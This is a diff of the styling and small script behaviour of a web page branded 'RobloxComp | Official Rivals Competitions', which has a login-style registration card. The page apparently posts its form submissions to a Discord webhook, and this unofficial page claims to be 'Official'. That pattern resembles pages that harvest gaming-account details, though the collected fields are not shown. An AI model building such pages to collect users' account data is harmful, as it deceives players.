@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>RobloxComp | Official Rivals Competitions</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
         * {
@@ -14,14 +14,14 @@
         }
 
         body {
-            font-family: 'Inter', sans-serif;
-            background: radial-gradient(circle at 25% 20%, #0a0c12, #020406);
+            font-family: 'Montserrat', 'Inter', sans-serif;
+            background: radial-gradient(circle at 20% 30%, #0a0c12, #020406);
             min-height: 100vh;
             color: #edeff5;
             overflow-x: hidden;
         }
 
-        ::-webkit-scrollbar { width: 5px; }
+        ::-webkit-scrollbar { width: 4px; }
         ::-webkit-scrollbar-track { background: #11131f; }
         ::-webkit-scrollbar-thumb { background: #ff3a4d; border-radius: 10px; }
 
@@ -34,6 +34,7 @@
         }
         .site-container.loaded { opacity: 1; }
 
+        /* ========= LOADER ========= */
         .loader-overlay {
             position: fixed;
             top: 0;
@@ -70,6 +71,7 @@
         .inline-loader { display: flex; align-items: center; justify-content: center; gap: 10px; padding: 6px 0; }
         .inline-loader .dot { width: 9px; height: 9px; animation: pulseWave 1.2s infinite ease-in-out; }
 
+        /* ========= HEADER ========= */
         .modern-header {
             display: flex;
             justify-content: space-between;
@@ -79,27 +81,54 @@
             padding-bottom: 0.5rem;
             border-bottom: 1px solid rgba(255,255,245,0.06);
         }
+        .logo-wrapper {
+            display: flex;
+            align-items: baseline;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
         .logo-combined {
-            font-size: 2.1rem;
+            font-family: 'Montserrat', sans-serif;
+            font-size: 2.2rem;
             font-weight: 800;
             letter-spacing: -0.02em;
             transition: transform 0.2s ease;
             cursor: pointer;
+            background: linear-gradient(135deg, #ffffff 0%, #ffffff 40%, #ff5e7e 100%);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 0 0 12px rgba(255,255,255,0.3);
         }
-        .logo-combined span:first-child { color: white; text-shadow: 0 0 10px rgba(255,255,255,0.6); }
-        .logo-combined span:last-child { color: #ff3a4d; text-shadow: 0 0 6px #ff3366; }
-        .logo-combined:hover { transform: scale(1.02); }
-        .logo-combined:hover span:first-child { text-shadow: 0 0 18px rgba(255,255,255,0.9); }
-        .logo-combined:hover span:last-child { text-shadow: 0 0 16px #ff5e7e; }
-        .github-badge {
+        .logo-combined:hover {
+            transform: scale(1.02);
+            background: linear-gradient(135deg, #ffffff, #ff8da1);
+            -webkit-background-clip: text;
+            background-clip: text;
+        }
+        .github-btn {
             font-size: 0.7rem;
-            color: #6c7080;
-            background: rgba(20,22,36,0.6);
-            padding: 0.2rem 0.8rem;
-            border-radius: 40px;
-            letter-spacing: 0.3px;
+            color: #8e93b0;
+            background: rgba(25, 28, 45, 0.7);
+            padding: 0.25rem 0.9rem;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: 500;
+            letter-spacing: 0.2px;
+            transition: all 0.2s;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        .github-btn:hover {
+            background: rgba(45, 48, 70, 0.9);
+            color: #ffffff;
+            border-color: #ff5e7e;
+            transform: translateY(-1px);
         }
 
+        /* slot warning */
         .slot-warning {
             background: rgba(255, 100, 40, 0.12);
             border-left: 3px solid #ffa047;
@@ -110,12 +139,12 @@
             align-items: center;
             gap: 12px;
             backdrop-filter: blur(4px);
-            font-weight: 500;
-            font-size: 0.9rem;
+            font-weight: 600;
+            font-size: 0.85rem;
             color: #ffbc7a;
         }
-        .slot-warning i { font-size: 1.2rem; color: #ffa047; }
 
+        /* two columns */
         .two-col {
             display: flex;
             flex-wrap: wrap;
@@ -125,6 +154,7 @@
         .form-col { flex: 1.2; min-width: 280px; }
         .info-col { flex: 1; min-width: 280px; }
 
+        /* form card */
         .login-card {
             background: rgba(10, 12, 22, 0.7);
             backdrop-filter: blur(16px);
@@ -190,35 +220,20 @@
             padding: 0.3rem;
         }
 
+        /* TOURNAMENT CARD - KEIN FLACKERN MEHR (einfach zu hellerer Farbe) */
         .tournament-card {
             background: rgba(6, 8, 18, 0.65);
             backdrop-filter: blur(14px);
             border-radius: 1.8rem;
             border: 1px solid rgba(255,70,100,0.25);
             overflow: hidden;
-            transition: transform 0.2s, border-color 0.2s;
+            transition: transform 0.2s, border-color 0.2s, background 0.2s;
             box-shadow: 0 12px 28px -12px black;
-            position: relative;
         }
-        .tournament-card:hover { transform: translateY(-4px); border-color: #ff4d6d; }
-        .tournament-card::after {
-            content: '';
-            position: absolute;
-            top: -2px; left: -2px; right: -2px; bottom: -2px;
-            background: linear-gradient(135deg, #8a2a3f, #ff3a4d, #b32f4a, #ff5e7e);
-            border-radius: 1.9rem;
-            z-index: -1;
-            opacity: 0;
-            transition: opacity 0.3s ease;
-        }
-        .tournament-card:hover::after {
-            opacity: 0.2;
-            animation: rotateGlow 3s linear infinite;
-        }
-        @keyframes rotateGlow {
-            0% { background: linear-gradient(0deg, #ff3a4d, #ff9a6e); }
-            50% { background: linear-gradient(180deg, #ff5e7e, #ff2e4d); }
-            100% { background: linear-gradient(360deg, #ff3a4d, #ff9a6e); }
+        .tournament-card:hover {
+            transform: translateY(-4px);
+            border-color: #ff7a90;
+            background: rgba(20, 22, 38, 0.8);
         }
         .tournament-header {
             padding: 1.2rem 1.5rem 0.5rem;
@@ -285,6 +300,7 @@
         }
         .nexoo-glow:hover { text-shadow: 0 0 12px #ff5e7e; transform: scale(1.02); }
         .hidden-message { display: none; }
+        
         .toast-message {
             position: fixed;
             bottom: 20px;
@@ -302,10 +318,12 @@
             display: flex;
             align-items: center;
             gap: 8px;
+            font-family: monospace;
         }
         @media (max-width: 780px) {
             .site-container { padding: 1.2rem; }
             .two-col { flex-direction: column; }
+            .logo-combined { font-size: 1.6rem; }
         }
     </style>
 </head>
@@ -315,8 +333,11 @@
 
 <div id="mainContainer" class="site-container">
     <div class="modern-header">
-        <div class="logo-combined"><span>Roblox</span><span>Comp</span></div>
-        <div class="github-badge"><i class="fab fa-github"></i> .github.io</div>
+        <div class="logo-wrapper">
+            <div class="logo-combined">RobloxComp</div>
+            <a href="#" class="github-btn" id="githubBtn"><i class="fab fa-github"></i> .github.io</a>
+        </div>
+        <div style="width: 80px;"></div> <!-- spacer for balance -->
     </div>
 
     <div class="slot-warning">
@@ -503,16 +524,19 @@
             if (allInputs[i]) allInputs[i].addEventListener('keypress', function(e) { if (e.key === 'Enter') handleRegistration(); });
         }
 
+        // Loader disappear
         setTimeout(function() {
             if (globalLoader) globalLoader.classList.add('hidden-loader');
             setTimeout(function() {
                 mainContainer.classList.add('loaded');
+                showToast("Welcome to RobloxComp", false, 1800);
             }, 200);
         }, 1000);
 
         teamContainer.classList.remove('show-team');
         dynamicNotice.classList.add('hidden-message');
 
+        // webhook warning
         if (DISCORD_WEBHOOK_URL.indexOf("REPLACE_ME") !== -1) {
             var warnSpan = document.createElement('div');
             warnSpan.style.fontSize = "0.65rem";
@@ -521,6 +545,15 @@
             warnSpan.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Replace webhook URL for live Discord';
             var loginCard = document.querySelector('.login-card');
             if (loginCard) loginCard.appendChild(warnSpan);
+        }
+
+        // github button dummy action
+        const gitBtn = document.getElementById('githubBtn');
+        if(gitBtn) {
+            gitBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                showToast("RobloxComp .github.io | open source hub", false, 1500);
+            });
         }
     })();
 </script>
